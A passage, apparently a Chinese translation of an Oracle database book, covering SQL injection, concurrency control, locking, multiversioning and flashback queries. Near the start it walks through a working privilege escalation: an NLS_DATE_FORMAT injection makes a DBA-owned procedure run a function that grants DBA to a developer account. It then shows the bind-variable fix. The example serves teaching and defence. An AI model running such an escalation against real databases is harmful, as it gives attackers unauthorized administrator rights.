  \ 权限怎么办？可以安全地假设他们有（毕竟他们是开发人员）。他们能在这个例子的基础上走得更远吗？当然可以。那个看似无害的存储过程，至少保证了对 `PWD_MGR`\
  \ 模式拥有读取权限的所有内容的读取访问；并且如果利用此漏洞的账户拥有 `CREATE PROCEDURE`（它确实有），该存储过程允许他们执行 `PWD_MGR`\
  \ 能够执行的任何命令！\n\n> **注意**\n> 本示例假设用户 `PWD_MGR` 已被授予带有 `ADMIN OPTION` 的 `DBA` 角色。\n\
  \n## 进阶利用\n\n然后，作为开发人员，我们将创建一个授予 `DBA` 的函数。关于这个函数有两个重要事实：它是一个*调用者权限例程*，意味着它将使用执行该例程的人员的权限来执行；它是一个*编译指示*\
  \ `autonomous_transaction` *例程*，意味着它会创建一个在例程返回前提交或回滚的子事务，因此使其有资格从 SQL 中调用。以下是该函数：\n\
  \n```\nSQL> create or replace function foo\nreturn varchar2\nauthid CURRENT_USER\n\
  as\npragma autonomous_transaction;\nbegin\nexecute immediate 'grant dba to dev';\n\
  return null;\nend;\n/\nFunction created.\n```\n\n现在我们要做的就是“欺骗” `PWD_MGR`（一个可以授予他人\
  \ DBA 权限的 DBA）来运行这个函数。鉴于我们为了利用 SQL 注入漏洞所做的工作，这很容易。我们将设置我们的 `NLS_DATE_FORMAT` 以包含对此函数的引用，并将对其的执行权限授予\
  \ `PWD_MGR`：\n\n```\nSQL> alter session set nls_date_format = '\"''union select\
  \ dev.foo from dual--\"';\nSession altered.\nSQL> grant execute on foo to pwd_mgr;\n\
  Grant succeeded.\n```\n\n然后，瞧！我们获得了 DBA 权限：\n\n```\nSQL> select * from session_roles;\n\
  no rows selected\nSQL> set serverout on\nSQL> exec pwd_mgr.inj( sysdate )\nselect\
  \ username\nfrom all_users\nwhere\ncreated = ''union select dev.foo from dual--'\n\
  .....\nPL/SQL procedure successfully completed.\n```\n\n现在我们需要重新连接到数据库，以便为会话实例化新授予的权限：\n\
  \n```\nSQL> conn dev/dev_pwd@PDB1\nSQL> select * from session_roles;\nROLE\n--------------------------------------------------------------------------------\n\
  PDB_DBA\nCONNECT\nRESOURCE\nSODA_APP\nSELECT_CATALOG_ROLE\nHS_ADMIN_SELECT_ROLE\n\
  AQ_ADMINISTRATOR_ROLE\nAQ_USER_ROLE\nADM_PARALLEL_EXECUTE_TASK\nGATHER_SYSTEM_STATISTICS\n\
  ```\n\n## 防御建议\n\n那么，你该如何保护自己呢？通过使用绑定变量。例如：\n\n```\nSQL> conn pwd_mgr/pwd_mgr_pwd@PDB1\n\
  SQL> create or replace procedure NOT_inj( p_date in date )\nas\nl_username   all_users.username%type;\n\
  c            sys_refcursor;\nl_query      varchar2(4000);\nbegin\nl_query := '\n\
  select username\nfrom all_users\nwhere created = :x';\ndbms_output.put_line( l_query\
  \ );\nopen c for l_query USING P_DATE;\nfor i in 1 .. 5\nloop\nfetch c into l_username;\n\
  exit when c%notfound;\ndbms_output.put_line( l_username || '.....' );\nend loop;\n\
  close c;\nend;\n/\nProcedure created.\nSQL> set serverout on\nSQL> alter session\
  \ set nls_date_format = '\"''union select dev.foo from dual--\"';\nSession altered.\n\
  SQL> exec NOT_inj(sysdate)\nselect username\nfrom all_users\nwhere created = :x\n\
  PL/SQL procedure successfully completed.\n```\n\n\n请注意，先前的输出不包含任何注入的恶意代码。这是一个简单明了的事实：如果你使用`绑定变量`，就不会遭受\
  \ SQL 注入攻击。如果你**不**使用`绑定变量`，你就必须一丝不苟地检查每一行代码，并像一个邪恶的天才（一个对`Oracle`的*所有*一切都了如指掌的人）那样思考，看看是否有办法攻击那段代码。我不知道你怎么想，但如果我能确定我\
  \ 99.9999%的代码不会受到 SQL 注入的影响，而我只需要担心剩下的 0.0001%（由于某种原因无法使用`绑定变量`的代码），那么我晚上会睡得安稳得多，远胜于不得不担心\
  \ 100%的代码都可能受到 SQL 注入攻击的情况。\n\n无论如何，在我在本节开头描述的那个特定项目中，重写现有代码以使用`绑定变量`是唯一可行的行动方案。由此产生的代码运行速度快了数个数量级，系统能够支持的并发用户数量也成倍增加。而且代码更安全——整个代码库都不再需要为\
  \ SQL 注入问题而进行审查。然而，这种安全性在时间和精力上付出了高昂的代价，因为我的客户不得不编写系统代码，然后`重新编写一遍`。这并非因为使用`绑定变量`困难或容易出错，只是因为他们最初没有使用，从而被迫回头修改几乎`所有`的代码。如果开发人员从一开始就明白在应用程序中使用`绑定变量`至关重要，我的客户本不必付出这个代价。\n\
  \n### 理解并发控制\n\n并发控制是数据库之间有所区别的一个领域。正是这个领域将数据库与文件系统区分开来，也将不同的数据库彼此区分开来。作为一名程序员，确保你的数据库应用程序在并发访问条件下能正确工作至关重要，然而人们却一次又一次地未能对此进行测试。如果一切都按顺序发生时效果良好的技术，在所有人同时进行操作时未必能同样有效。如果你不充分了解你所使用的特定数据库如何实现`并发控制`机制，那么你将：\n\
  \n*   破坏数据的完整性。\n*   导致应用程序在用户数量较少时运行得比应有的速度慢。\n*   降低应用程序扩展到大量用户的能力。\n\n请注意，我并不是说“你可能会……”或“你面临……的风险”，而是说你*必然*会做这些事。你甚至会在不知不觉中就做了这些事。没有正确的`并发控制`，你将破坏数据库的完整性，因为某些在隔离状态下有效的方法在多用户环境中将不会如你所愿地工作。你的应用程序运行速度将比应有的慢，因为你最终会等待数据。你的应用程序将因为`锁定`和争用问题而失去扩展能力。随着访问资源的队列变长，等待时间也会越来越长。\n\
  \n这里的一个类比是收费站前的车辆排队。如果车辆以有序、可预测的方式一辆接一辆地到达，就不会出现排队。如果许多车辆同时到达，队列就会开始形成。此外，等待时间并不随着收费站车辆数量的增加而线性增长。超过某一点后，相当多的额外时间会花在“管理”排队等待的人员以及为他们服务上（在数据库中的对应情况就是上下文切换）。\n\
  \n并发问题是最难追踪的；这个问题类似于调试一个多线程程序。该程序在调试器的受控、人工环境中可能运行良好，但在现实世界中却会灾难性地崩溃。例如，在竞态条件下，你会发现两个线程可能最终同时修改同一个数据结构。这类错误极难追踪和修复。如果你只是在隔离状态下测试应用程序，然后将其部署给数十个并发用户，你很可能会（痛苦地）暴露出一个未被发现的并发问题。\n\
  \n在接下来的两节中，我将举两个小例子，说明对`并发控制`缺乏了解如何会毁掉你的数据或抑制性能和可扩展性。\n\n#### 实现锁定\n\n数据库使用`锁`来确保在任何时候，最多只有一个事务在修改给定的数据。基本上，`锁`是实现并发的机制——如果没有某种锁定模型来防止对同一行进行并发更新（例如），那么多用户访问在数据库中就不可能实现。然而，如果过度使用或使用不当，`锁`实际上会抑制并发。如果你或数据库本身不必要地锁定了数据，能够同时执行操作的人数就会减少。因此，要开发一个可扩展、正确的应用程序，理解什么是`锁定`以及它在你所使用的数据库中如何工作至关重要。\n\
  \n同样至关重要的是，你要理解每个数据库实现`锁定`的方式不同。有些数据库使用`页级锁定`，有些使用`行级锁定`；有些实现会将`锁`从`行级`升级到`页级`，有些则不会；有些使用`读锁`，有些则不使用；有些数据库通过`锁定`实现`可串行化`事务，而另一些则通过数据的`读一致性`视图（不使用`锁`）来实现。如果你不了解这些机制如何工作，这些细微的差异可能会膨胀为你应用程序中的巨大性能问题或彻头彻尾的错误。\n\
  \n以下几点总结了`Oracle`的`锁定`策略：\n\n*   `Oracle`在修改时在`行级`锁定数据。不会发生向`数据块`或`表级`的`锁升级`。\n\
  *   `Oracle`绝不会仅仅为了读取数据而锁定数据。简单的读取操作不会在数据行上放置`锁`。\n*   数据的写入者不会阻塞数据的读取者。让我重复一遍：*读*操作不会被*写*操作阻塞。这与许多其他数据库有着根本的不同，在那些数据库中，读操作会被写操作阻塞。虽然这听起来是一个极其积极的特性（而且通常确实是），但如果你对此理解不透彻，并试图在应用程序中通过应用逻辑来强制实施完整性约束，*你很可能会做错*。\n\
  *   数据的写入者只在另一个写入者已经锁定了其目标行时才会被阻塞。数据的读取者永远不会阻塞数据的写入者。\n\n在开发应用程序时，你必须考虑这些事实，同时你也要意识到这个策略是`Oracle`特有的；每个数据库在`锁定`方法上都有细微的差异。即使你在应用程序中采用最基础通用的`SQL`，每个供应商所采用的`锁定`和`并发控制`模型也注定了会存在差异。一个不理解其数据库如何处理`并发`的开发人员，肯定会遇到数据完整性问题。（当开发人员从另一个数据库转到`Oracle`，或者反之，并且在应用程序中忽略了不同的`并发`机制时，这种情况尤其常见。）\n\
  \n\n## 防止丢失更新\n\nOracle 非阻塞机制的一个副作用是，如果你确实想确保一次只有一个用户能访问某一行，那么作为开发人员，你需要自己完成一些额外的工作。\n\
  \n### 一个并发预订问题示例\n\n一位开发人员向我展示了一个他刚刚开发并正在部署的资源调度程序（用于会议室、投影仪等）。该应用程序实现了一个业务规则，以防止在任何给定时间段内将一个资源分配给多个人。也就是说，应用程序中包含了专门检查是否有其他用户先前已预订该时间段的代码（至少开发人员是这么认为的）。这段代码查询了\
  \ `SCHEDULES` 表，如果没有发现与该时间段重叠的行，就插入新行。因此，开发人员基本上关注的是两张表：\n\n```sql\ncreate table\
  \ resources\n( resource_name varchar2(25) primary key,\nother_data    varchar2(25)\
  \ );\ncreate table schedules\n( resource_name varchar2(25) references resources,\n\
  start_time    date,\nend_time      date );\n```\n\n并且，在将一个房间预订插入 `SCHEDULES` 表后，并在提交之前，应用程序会立即进行如下查询：\n\
  \n```sql\nselect count(*)\nfrom schedules\nwhere resource_name = :resource_name\n\
  and (start_time < :new_end_time and end_time > :new_start_time);\n```\n\n这看起来简单且万无一失（至少对开发人员来说）；如果计数返回为\
  \ 1，这个房间就归你了。如果返回值大于 1，你就无法预订该时间段。当我了解到他的逻辑后，我设置了一个非常简单的测试来向他展示当应用程序上线时会发生错误——这种错误在事后将非常难以追踪和诊断。你会坚信这*一定*是数据库的\
  \ bug。\n\n我所做的只是让另一个人使用他旁边的终端。两人导航到同一个屏幕，并数到三时，各自点击了“Go”按钮，尝试预订同一个房间的重叠时间段。结果两个人的预订都成功了。这个在孤立环境下完美工作的逻辑，在多用户环境中失败了。部分原因在于\
  \ Oracle 的非阻塞读取。任何一个会话都没有阻塞另一个会话。两个会话都简单地运行了查询，然后执行了预订房间的逻辑。即使另一个会话已经开始修改 `SCHEDULES`\
  \ 表（更改在提交前对另一个会话不可见），他们仍然可以运行查询来查找预订记录。由于对每个用户来说，他们看起来都没有尝试修改 `SCHEDULES` 表中的同一行，因此他们永远不会相互阻塞，于是业务规则就无法强制执行它本应强制的内容。\n\
  \n### 解决方案：手动序列化\n\n这令开发人员感到惊讶——他编写过许多数据库应用程序——因为他的背景是使用读锁的数据库。也就是说，数据的读取者会被数据的写入者阻塞，而数据的写入者也会被该数据的并发读取阻塞。在他的世界里，其中一个事务本应阻塞另一个——或者应用程序可能会发生死锁。但无论如何，总会有一个事务最终失败。\n\
  \n因此，开发人员需要一种在多用户环境中强制执行业务规则的方法——一种确保同一时间只有一个人对给定资源进行预订的方法。在这个案例中，解决方案是他自己进行一些序列化。除了执行前面的\
  \ `count(*)` 查询外，开发人员首先执行了以下操作：\n\n```sql\nselect * from resources where resource_name\
  \ = :resource_name FOR UPDATE;\n```\n\n他在这里做的是，在安排资源（房间）*之前*立即锁定它，换句话说，在查询该资源的 `SCHEDULES`\
  \ 表之前。通过锁定他试图安排的资源，开发人员确保没有其他人同时修改此资源的日程表。任何其他想要对同一资源执行 `SELECT FOR UPDATE` 的人都必须等待，直到事务提交，此时他们才能看到日程表。重叠日程的风险被消除了。\n\
  \n### 并发性与理解\n\n开发人员必须理解，在多用户环境中，他们有时必须采用类似于多线程编程中使用的技术。在这个案例中，`FOR UPDATE` 子句的作用类似于信号量。它为该特定行在\
  \ `RESOURCES` 表上的访问进行序列化——确保不会有两个人同时安排它。\n\n使用 `FOR UPDATE` 方法仍然具有高度的并发性，因为可能有成千上万的资源可供预订。我们所做的只是确保在任何时候只有一个人修改一个资源。这是一个罕见的情况，我们确实需要手动锁定我们实际上不会更新的数据。你需要能够识别在哪里必须手动加锁，也许同样重要的是，在哪些情况下不要这样做（我稍后会给出一个例子）。此外，`FOR\
  \ UPDATE` 子句不会像在其他数据库中那样阻止其他人读取数据。因此，这种方法可以很好地扩展。\n\n### 跨数据库移植与并发意识\n\n本节中描述的问题在将应用程序从一个数据库移植到另一个数据库时具有巨大的影响（我将在本章稍后回到这个主题），这些问题一次又一次地让人们栽跟斗。例如，如果你在其他数据库（写入者阻塞读取者，反之亦然）方面经验丰富，你可能已经变得依赖这个事实来保护你免受数据完整性问题的影响。*缺乏*并发性是一种保护自己的方式。这是许多非\
  \ Oracle 数据库的工作方式。而在 Oracle 中，并发性至高无上，你必须意识到，因此事情的发生方式会有所不同（否则就要承担后果）。\n\n我曾参与过设计会议，开发人员即使在被展示了这类例子后，也嘲笑他们需要真正理解这一切是如何工作的想法。他们的回应是：“我们只是在我们的\
  \ Hibernate 应用程序中勾选‘事务性’框，它就会为我们处理所有事务性事情。我们不需要知道这些东西。”我对他们说：“那么 Hibernate 会为 SQL\
  \ Server、DB2 和 Oracle 生成不同的代码吗？完全不同的代码、不同数量的 SQL 语句、不同的逻辑？”他们说不会，但它会是事务性的。这没有抓住重点。这里的事务性仅仅意味着你支持提交和回滚，并不意味着你的代码在事务上是一致的（请理解为“并不意味着你的代码是正确的”）。无论你使用什么工具或框架来访问数据库，如果你想避免破坏数据，了解并发控制都是至关重要的。\n\
  \n### 何时需要关注锁定\n\n99% 的情况下，锁定是完全透明的，你无需关心它。你必须训练自己识别的就是那剩下的 1%。对于这个问题，没有简单的“如果你做了\
  \ X，就需要做 Y”清单。成功的并发控制在于理解你的应用程序在多用户环境中将如何表现，以及它在你的数据库中将如何表现。\n\n当我们讲到有关锁定和并发控制的章节时，我们会更深入地探讨这个话题。在那里你将了解到，本节介绍的这种完整性约束强制实施（你必须强制执行一个跨越单表多行或在多个表之间的规则，如参照完整性约束），是你必须始终特别注意的情况，并且很可能不得不诉诸于手动锁定或其他技术，以确保在多用户环境中的数据完整性。\n\
  \n\n### 多版本机制\n\n这个主题与并发控制紧密相关，因为它构成了 Oracle 并发控制机制的基础。Oracle 采用的是多版本、读一致性的并发模型。在第\
  \ 7 章中，我们将更详细地介绍其技术细节，但本质上，它是一种使 Oracle 能够提供以下功能的机制：\n\n*   读一致的查询：产生的结果相对于某个时间点是一致的查询。\n\
  *   非阻塞的查询：查询永远不会被数据的写入者阻塞，就像在其他数据库中那样。\n\n这是 Oracle 数据库中两个非常重要的概念。术语 `多版本机制` 基本上描述了\
  \ Oracle 能够同时维护数据库中数据的多个版本的能力。术语 `读一致性` 反映了这样一个事实：Oracle 中的查询将返回从一个一致时间点的数据结果。查询使用的每个数据块都将“截至”完全相同的时间点——即使它在您执行查询期间被修改或锁定。如果您理解\
  \ `多版本机制` 和 `读一致性` 如何协同工作，您就能始终理解从数据库获得的答案。在我们更详细地探讨 Oracle 如何实现这一点之前，这里是我所知的在 Oracle\
  \ 中 `演示` `多版本机制` 最简单的方式：\n\n```sql\n$ sqlplus eoda/foo@PDB1\nSQL> drop table t purge;\n\
  SQL> create table t as select username, created  from all_users;\n表已创建。\nSQL> set\
  \ autoprint off\nSQL> variable x refcursor;\nSQL> begin\nopen :x for select * from\
  \ t;\nend;\n/\nPL/SQL 过程已成功完成。\nSQL> declare\npragma autonomous_transaction;\n--\
  \ 您也可以在另一个\n-- sqlplus 会话中执行此操作，\n-- 效果是相同的\nbegin\ndelete from t;\ncommit;\nend;\n\
  /\nPL/SQL 过程已成功完成。\nSQL> print x\nUSERNAME                  CREATED\n-------------------------\
  \ --------------------\nSYS                       20-11 月-20\nAUDSYS           \
  \         20-11 月-20\nSYSTEM                    20-11 月-20\nSYSBACKUP          \
  \       20-11 月-20\nSYSDG                     20-11 月-20\nSYSKM                \
  \     20-11 月-20\nSYSRAC                    20-11 月-20\nOUTLN                  \
  \   20-11 月-20\nREMOTE_SCHEDULER_AGENT    20-11 月-20\nGSMADMIN_INTERNAL        \
  \ 20-11 月-20\n```\n\n表 1-1 总结了这个 `多版本机制` 示例的时序和操作。\n\n**表 1-1** 在 Oracle 中演示 `多版本机制`\n\
  \n| 时间 | 操作 |\n| --- | --- |\n| 时间 1 | 创建表 `T` 并加载数据。 |\n| 时间 2 | 打开用于从表 `T` 查询的游标\
  \ `X`。 |\n| 时间 3 | 删除表 `T` 中的所有行并 `COMMIT`。 |\n| 时间 4 | 从表 `T` 查询，显示表中已无行。 |\n|\
  \ 时间 5 | 从游标 `X` 获取数据，显示的数据是时间 2 时表 `T` 中存在的行。 |\n\n在这个例子中，我们创建了一个测试表 `T`，并从 `ALL_USERS`\
  \ 表加载了一些数据。我们在该表上打开了一个游标。我们从那个游标中*没有获取任何数据*：我们只是打开了它并保持其打开状态。\n\n注意\n\n请记住，Oracle\
  \ 并不会“预先回答”查询。当您打开游标时，它不会将数据复制到任何地方——想象一下，如果它这么做，在一个有十亿行数据的表上打开游标需要多长时间。游标是瞬间打开的，并且它在获取过程中回答查询。换句话说，当您从游标获取数据时，它只是从表中读取数据。\n\
  \n在同一个会话中（或者在另一个会话中执行也可以；同样会生效），我们继续删除表中的所有数据。我们甚至对这个 `DELETE` 操作进行了 `COMMIT`。这些行消失了——但它们真的消失了吗？事实上，它们仍然可以通过游标（或使用\
  \ `AS OF` 子句的 `FLASHBACK` 查询）检索到。事实是，`OPEN` 命令返回给我们的结果集在我们打开它的那一刻就已经被确定了。在打开游标时，我们并没有触及该表中的任何一个数据块，但答案已经固定不变了。在获取数据之前，我们无法知道答案是什么；然而，从游标的视角来看，结果是不可变的。这并不是说\
  \ Oracle 在我们打开游标时将所有先前的数据复制到了其他某个位置；实际上是 `DELETE` 命令通过将数据（在 `DELETE` 之前存在的行的前映像副本）放入一个称为\
  \ `undo` 或 `rollback segment` 的数据区域中，为我们保存了数据。\n\n\n\n## 闪回\n\n过去，Oracle 总是决定我们的查询在哪个时间点是一致的。也就是说，Oracle\
  \ 使得我们打开的任何结果集都相对于以下两个时间点之一保持最新：\n\n*   查询被打开的时间点：这是 `READ COMMITTED` 隔离级别（我们将在第\
  \ 7 章介绍 `READ COMMITTED`、`READ ONLY` 和 `SERIALIZABLE` 事务级别的区别）下的默认行为。\n*   该查询所属的事务开始的时间点：这是\
  \ `READ ONLY` 和 `SERIALIZABLE` 事务级别下的默认行为。\n\n然而，借助 Oracle 的闪回查询功能，我们可以告诉 Oracle\
  \ “基于”（当然，对于可以回溯到过去的时间长度有一些合理的限制）某个时间点来执行查询。借此，你可以更直接地“看到”读一致性和多版本机制。\n\n注意：用于长期闪回查询（回溯数月或数年）的闪回数据归档，**不使用**读一致性和多版本机制来生成数据库在过去某个时间点的数据版本。相反，它使用已存入归档的记录的前映像副本。我们将在后面的章节中回到闪回数据归档。另请注意，闪回数据归档是数据库的一项功能，无需额外许可费用即可使用。\n\
  \n考虑下面的例子。我们首先获取一个 `SCN`（系统改变号或系统提交号；这两个术语可互换使用）。这个 `SCN` 是 Oracle 的内部时钟：每次发生提交时，这个时钟都会向前滴答（递增）。我们也可以使用日期或时间戳，但这里\
  \ `SCN` 很容易获得且非常精确：\n\n```sql\n$ sqlplus scott/tiger@PDB1\nSQL> variable scn number\n\
  SQL> exec :scn := dbms_flashback.get_system_change_number;\nPL/SQL procedure successfully\
  \ completed.\nSQL> print scn\nSCN\n----------\n```\n\n注意：在你的系统上，`DBMS_FLASHBACK`\
  \ 包可能有访问限制。你可能需要先对你所使用的模式授予对该包的执行权限，然后才能访问它。\n\n我们检索了 `SCN`，以便告诉 Oracle 我们希望查询“基于”哪个时间点；我们也可以用日期或时间戳代替\
  \ `SCN`。我们希望稍后能够查询 Oracle 并查看在这个精确时间点该表中的内容。首先，让我们看看 `EMP` 表中当前的内容：\n\n```sql\n\
  SQL> select count(*) from emp;\n\n  COUNT(*)\n----------\n        14\n```\n\n现在，让我们删除所有这些信息并验证它已“消失”：\n\
  \n```sql\nSQL> delete from emp;\n\n14 rows deleted.\n\nSQL> select count(*) from\
  \ emp;\n\n  COUNT(*)\n----------\n         0\n\nSQL> commit;\n\nCommit complete.\n\
  ```\n\n然而，使用带有 `AS OF SCN` 或 `AS OF TIMESTAMP` 子句的闪回查询，我们可以要求 Oracle 向我们显示在该时间点表中的内容：\n\
  \n```sql\nSQL> select count(*),\n       :scn then_scn,\n       dbms_flashback.get_system_change_number\
  \ now_scn\n     from emp as of scn :scn;\n\n  COUNT(*)   THEN_SCN    NOW_SCN\n----------\
  \ ---------- ----------\n        14   13646156   13646157\n```\n\n在 Oracle 中，你有一个名为“flashback”的命令，它利用这种底层的多版本技术，允许你将对象恢复到过去某个时间点的状态。在本例中，我们可以将\
  \ `EMP` 表恢复到删除所有信息之前的状态（作为此过程的一部分，我们需要启用行移动，这允许分配给行的 `rowid` 发生改变——这是闪回表的必要前提）：\n\
  \n```sql\nSQL> alter table emp enable row movement;\n\nTable altered.\n\nSQL> flashback\
  \ table emp to scn :scn;\n\nFlashback complete.\n\nSQL> select cnt_now, cnt_then,\n\
  \       :scn then_scn,\n       dbms_flashback.get_system_change_number now_scn\n\
  \     from (select count(*) cnt_now from emp),\n          (select count(*) cnt_then\
  \ from emp as of scn :scn);\n\n   CNT_NOW   CNT_THEN   THEN_SCN    NOW_SCN\n----------\
  \ ---------- ---------- ----------\n        14         14   13646156   13646786\n\
  ```\n\n这就是读一致性和多版本机制的全部意义所在。如果你不理解 Oracle 的多版本方案如何工作及其含义，你将无法充分利用 Oracle 或编写正确的\
  \ Oracle 应用程序（那些能确保数据完整性的应用程序）。\n\n注意：闪回表功能需要 Oracle 企业版。\n\n\n"
- "# 读一致性与非阻塞读\n\n让我们看看多版本机制带来的影响：读一致性查询和非阻塞读。如果你不熟悉多版本机制，下面的代码可能会让你感到惊讶。为了简单起见，假设我们要读取的表在每个数据库块中存储一行（数据库中最小的存储单元），并且在这个例子中我们正在对表进行全表扫描。\n\
  \n我们要查询的表是一个简单的 `ACCOUNTS` 表。它存储了银行账户的余额。它的结构非常简单：\n\n```sql\nSQL> create table\
  \ accounts\n( account_number number primary key,\naccount_balance number);\n```\n\
  \n在现实中，`ACCOUNTS` 表会有数十万行，但为了简单起见，我们只考虑一个有四行的表，如表 1-2 所示。（我们将在第 7 章更详细地讨论这个例子。）\n\
  \n**表 1-2**\n账户表内容\n\n| 行 | 账户号码 | 账户余额 |\n| --- | --- | --- |\n| 1 | 123 | $500.00\
  \ |\n| 2 | 234 | $250.00 |\n| 3 | 345 | $400.00 |\n| 4 | 456 | $100.00 |\n\n我们想运行一个日终报告，告诉我们银行里有多少钱。这是一个极其简单的查询：\n\
  \n```sql\nSQL> select sum(account_balance) from accounts;\n```\n\n当然，在这个例子中，答案显而易见：$1250。但是，如果我们读了第\
  \ 1 行，而在我们读第 2 行和第 3 行时，一个自动柜员机（ATM）生成了针对此表的事务，将$400 从账户 123 转移到账户 456，会发生什么？我们的查询在第\
  \ 4 行计入了$500，结果得出$1650，不是吗？嗯，当然，这是需要避免的，因为这会是一个错误——在任何时间点，账户余额列中都不存在这个金额的总和。读一致性就是\
  \ Oracle 避免这种情况发生的方式。Oracle 的方法与大多数其他数据库不同，你需要理解它是如何工作的。\n\n在许多其他数据库中，如果你想获得一个“一致”且“正确”的查询答案，你要么必须在计算总和时锁定整个表，要么必须在读取行时锁定它们。这可以防止其他人在你获取结果的过程中更改数据。如果你提前锁定了表，你将得到查询开始时数据库中的答案。如果你在读取数据时锁定数据（通常称为\
  \ *共享读锁*，它阻止更新，但不阻止其他读取器访问数据），你将得到查询结束时数据库中的答案。这两种方法都在很大程度上抑制了并发性。表锁会在你的查询持续期间阻止对整个表进行任何更新（对于一个只有四行的表，这可能只是一个非常短的时间，但对于有数十万行的表，可能需要几分钟）。而“边读边锁”的方法会阻止对你已经读取和处理过的数据进行更新，并且实际上可能导致你的查询和其他更新之间的死锁。\n\
  \n之前我说过，如果不理解多版本的概念，你就无法充分利用 Oracle。下面就是一个原因。Oracle 使用多版本机制来获取查询开始时存在的数据，并且查询将在\
  \ **不锁定任何东西** 的情况下进行（虽然我们的账户转账事务更新了第 1 行和第 4 行，这些行会对其他写入者锁定，但不会对其他读取器，比如我们的 `SELECT\
  \ SUM...` 查询锁定）。事实上，Oracle 没有“共享读锁”（其他数据库中常见的一种锁类型）——它不需要。所有可以消除的抑制并发性的因素都已被移除。\n\
  \n我见过一些真实的案例，一个不理解 Oracle 多版本能力的开发者编写的报表会将整个系统锁得死死的。原因在于：开发者希望从他的查询中获得读一致（即正确）的结果。在他工作过的其他所有数据库中，这都要求锁定表或使用\
  \ `SELECT ... WITH HOLDLOCK`（一种 SQL Server 机制，用于在读取过程中以共享模式锁定行）。因此，开发者要么在运行报表前锁定表，要么使用\
  \ `SELECT ... FOR UPDATE`（这是他找到的与 `WITH HOLDLOCK` 最接近的替代方案）。这会导致系统基本上停止处理事务——这是不必要的。\n\
  \n那么，Oracle 是如何在不锁定任何数据的情况下——换句话说，在不降低并发性的情况下——在读取过程中获得正确、一致的答案（$1250）的呢？秘密在于 Oracle\
  \ 使用的事务机制。每当你修改数据时，Oracle 会在两个不同的位置创建条目（大多数其他数据库会将两个条目放在同一个位置；对它们来说，撤销和重做只是“事务数据”）。一个条目进入重做日志，Oracle\
  \ 在其中存储足够的信息来 **重做** 或“前滚”事务。对于插入操作，这将是插入的行。对于删除操作，它在概念上是一条删除文件 X、块 Y、行槽 Z 中行的消息。等等。另一个条目是一个\
  \ **撤销** 条目，写入一个撤销段。如果你的事务失败并需要撤销，Oracle 将从撤销段中读取“之前”映像并恢复数据。除了使用这个撤销段数据来撤销事务外，Oracle\
  \ 还用它来在读取块时撤销对块的更改——将块恢复到你的查询开始时的状态。这使你能够直接读取穿过锁，并且无需自己锁定任何数据即可获得一致、正确的答案。\n\n因此，就我们的例子而言，Oracle\
  \ 得到答案的过程如表 1-3 所示。\n\n**表 1-3**\n多版本机制实战\n\n| 时间 | 查询 | 账户转账事务 |\n| --- | --- |\
  \ --- |\n| T1 | 读取第 1 行；余额 = $500；当前总和 = $500。 | |\n| T2 | | 更新第 1 行；在第 1 行上放置排他锁，阻止其他更新（但不阻止读取）。第\
  \ 1 行现在有$100。 |\n| T3 | 读取第 2 行；余额 = $250；当前总和 = $750。 | |\n| T4 | 读取第 3 行；余额 =\
  \ $400；当前总和 = $1150。 | |\n| T5 | | 更新第 4 行；在第 4 行上放置排他锁，阻止其他更新（但不阻止读取）。第 4 行现在有$500。\
  \ |\n| T6 | 读取第 4 行；发现第 4 行已被修改。它实际上会回滚该块，使其看起来与时间 = T1 时一样。查询将从该块中读取值 $100。 | |\n\
  | T7 | | 提交事务。 |\n| T8 | 给出答案 $1250。 | |\n\n在时间 T6，Oracle 实际上“读穿”了我们的事务在第 4 行上放置的锁。这就是非阻塞读如何实现的：Oracle\
  \ 只检查数据是否已更改；它不关心数据当前是否被锁定（这暗示数据可能已更改）。Oracle 只是简单地从撤销段中检索旧值，然后继续处理下一个数据块。\n\n这是多版本机制的又一个清晰展示。同一信息的多个版本，都处于不同的时间点，在数据库中都是可用的。Oracle\
  \ 能够使用这些不同时间点的数据快照来为我们提供读一致性查询和非阻塞读。\n\n这种数据的读一致性视图总是在 SQL 语句级别执行。任何单个 SQL 语句的结果都相对于它们开始的时间点保持一致。这种特性使得像下面这样的插入操作能产生可预测的数据集：\n\
  \n```sql\nfor x in (select * from t)\nloop\ninsert into t values (x.username, x.user_id,\
  \ x.created);\nend loop;\n```\n\n\n当查询开始执行时，`SELECT * FROM T`的结果是确定的。该`SELECT`语句不会看到由`INSERT`生成的任何新数据。想象一下，如果它能看到的话——这条语句可能会成为一个永无止境的循环。如果随着`INSERT`在表`T`中生成更多行，`SELECT`能够“看到”这些新插入的行，那么前面的代码将会产生未知数量的行。如果表`T`最初有\
  \ 10 行，那么当我们结束时，`T`中可能最终会有 20、21、23 行或无限多行。这将是完全不可预测的。所有语句都提供了这种一致读取，因此像下面这样的`INSERT`也是可预测的：\n\
  \n```\ninsert into t select * from t;\n```\n\n`INSERT`语句将会获得表`T`的一个读一致视图。它不会看到自己刚刚插入的行；相反，它只会插入在`SELECT`开始时已存在的行。一些数据库甚至不允许像前面那样的递归语句，因为它们无法判断实际上可能插入多少行。\n\
  \n因此，如果你习惯于其他数据库在查询一致性和并发方面的处理方式，或者你从未需要处理这些概念（即你没有真正的数据库经验），你现在就能明白理解 Oracle 如何运作对你来说将是多么重要。为了最大化\
  \ Oracle 的潜力，并编写出正确的代码，你*需要*理解这些问题在 Oracle 中的表现——而不是它们在其他数据库中是如何实现的。\n\n## 数据库独立性？\n\
  \n至此，你或许能看出我本节要讨论的方向。我已经提到了其他数据库，以及特性在每个数据库中的实现方式如何不同。除了某些只读应用程序之外，我的观点是：构建一个完全数据库独立且高度可扩展的应用程序是极其困难的——事实上，除非你确切且详细地知道每个数据库如何运作，否则几乎是不可能的。而且，如果你真的详细知道每个数据库如何运作，你就会明白数据库独立性并不是你真正想要达成的目标（这是一个非常循环的论证！）。\n\
  \n为了说明，让我们重新审视最初的资源调度器示例（在添加`FOR UPDATE`子句之前）。假设这个应用程序是在一个与 Oracle 的锁/并发模型完全不同的数据库上开发的。我在这里要说明的是，如果你将应用程序从一个数据库迁移到另一个，你将不得不验证它在这些不同环境中是否仍能正确工作，并且在迁移过程中需要对它进行实质性的修改！\n\
  \n让我们假设我们最初将资源调度器应用程序部署在一个采用阻塞式读取（读取被写入阻塞）的数据库中。同时，假设业务规则是通过数据库触发器实现的（在`INSERT`发生之后，但在事务提交之前，我们会验证该时间段内表中是否只有我们的行存在）。在一个阻塞式读取系统中，由于这个新插入的数据，对这个表的插入操作确实会串行化。第一个人会插入对“房间\
